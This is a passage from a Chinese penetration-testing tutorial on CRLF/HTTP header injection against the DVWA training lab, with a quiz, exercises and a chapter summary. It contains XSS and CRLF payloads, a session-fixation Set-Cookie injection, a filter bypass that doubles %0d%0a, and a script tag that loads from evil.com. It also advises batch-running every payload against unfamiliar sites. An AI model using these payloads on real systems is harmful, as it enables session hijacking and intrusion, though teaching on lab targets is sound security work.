> - 进场先看服务器架构（PHP 版本、Apache/Nginx 版本）→ 看表最后一列有没有对应的版本限定 payload（比如 `%00` 截断只对 PHP<5.3.4 有效）
> - 一个模块先打 **Low 那列的 Payload** → 不行再试 **Medium 列的"绕"** → 再不行用 **High 列的"终极绕过 + Token 处理"**
> - **遇到完全没见过的站点，把表中列的所有 payload 按顺序跑一遍**（Burp Intruder 批量），命中率 90% 以上

---

## 18.8 课后自测 + 作业 📝（零基础必做！）

### 📝 题 1：选择题（每题 10 分，共 40 分）

**1. HTTP 头注入（CRLF 注入）的关键字符组合是？**
- A. `\t\n`（Tab + 换行）
- B. `\r\n`（回车 + 换行，URL 编码 %0d%0a）
- C. `\\`（转义反斜杠）
- D. `<>`（HTML 标签尖括号）

**2. 某开发者写 `str_replace(array("\r\n","\r","\n"), "", $user_input)` 防 CRLF，下列哪个绕过思路是对的？**
- A. 用反斜杠 `\r\n` 代替
- B. 双写 `\r\n\r\n`（让它删第一组后剩第二组，因为 str_replace 只扫一遍）
- C. 这个写法万无一失，不可能绕过
- D. 把 `\r\n` 转成中文的"回车换行"四个汉字

**3. 下列哪个属于"Session 固定攻击"？**
- A. 通过 SQL 注入导出管理员 Session
- B. 用 CRLF 注入给受害者加一个 `Set-Cookie: PHPSESSID=我知道的固定ID`，受害者登录后黑客用同样 Session 登录
- C. 用 XSS 弹窗 alert(document.cookie) 看到 Session
- D. 暴力破解 Session ID 的范围

**4. 想在 XSS 绕 CSP `script-src 'self'` 过滤，下列哪个思路是错的？**
- A. 用 `<img src=x onerror=alert(1)>` 事件触发
- B. 用 `<svg onload=alert(1)>` 事件触发
- C. 用 `<script src="http://evil.com/x.js"></script>` 外链脚本
- D. 用 `<a href="javascript:alert(1)">` + 触发点击

### 🔧 题 2：实操题（每题 20 分，共 40 分）

**实操 1：Low 级别 Header Injection 打出 XSS 弹窗**
打开 DVWA → 切 low → HTTP Header Injection，构造 payload，**截图弹窗那一刻保存**。

**实操 2：CheatSheet 默写训练**
不看本章内容，找一张空白纸，在 5 分钟内默写出下列 5 个模块 Low 级别的 Payload：① SQLi 显注 ② SQLi Blind 布尔猜第 1 字符 ③ 反射型 XSS ④ 命令注入 ⑤ 重定向。**对 4 个以上算通关。**

### 💡 题 3：思考题（20 分）

> 你是公司安全工程师，研发部同事写了如下代码（根据用户喜欢的主题名，设置 Cookie 给下一个页面用）：
> ```php
> header("Set-Cookie: site_theme=" . $_GET['theme'] . "; path=/;");
> ```
> 请你至少写出：
> ① 1 个能触发 CRLF 注入打 XSS 的 Payload
> ② 2 条具体的修复建议（除了"用白名单"之外，还要说清楚 PHP 该调用什么内置函数对 Cookie 值进行编码？）

---

## 18.9 本章小结 + 下章预告 🚀

**🎉 Day18 HTTP 头注入 + DVWA 查漏 通关总结：**
- ✅ 搞懂了 CRLF 注入的原理 = "用户输入里的换行符被服务器当成头结束标志，从而允许插入任意头 / 任意 Body"
- ✅ Low 级直打 Payload：① Session 固定注入 Set-Cookie ② 两个 CRLF 跳到 Body 打 XSS
- ✅ Medium 级双写绕过：写两遍 `%0d%0a%0d%0a`，`str_replace` 只删一组剩一组
- ✅ High 级：正则去 CRLF + in_array 白名单 + urlencode（三层防御，已经够硬）
- ✅ Impossible 级：用户输入当下标，真实写入 Cookie 的是**服务器写死的常量**，彻底 0 信任用户输入
- ✅ 补齐了 6 个高频彩蛋：DOM XSS 事件触发、Stored XSS 盲打、GET 型 CSRF、`%00` 截断文件上传、命令注入绕空格 4 法、SQL 注入十六进制绕引号
- ✅ 拿到了价值连城的 **《DVWA 全模块 Low/Med/High 速通 CheatSheet》**——机试前最后 10 分钟就背它！

**下一章 Day19：DVWA 通关总复习 + 学习路线续篇（SQLi-Labs 预告）**，这将是我们 DVWA 专题的"毕业典礼"——我会把 Day5~Day18 学过的所有漏洞按"**漏洞危害金字塔**"重新排序，告诉你现实世界中的优先级、每个漏洞真实 PTE 机试考多少分、以及**作为零基础小白，学完 DVWA 之后下一步该怎么走**（SQLi-Labs 加强 SQL → Pikachu 中文靶场 → 靶机 VulnHub 提权 → CTF 平台 → 真实护网面试一条龙）！🎓

**同学们先把 CheatSheet 保存到手机里睡前看一遍！Day19 我们"DVWA 毕业典礼"不见不散！👋🎊**
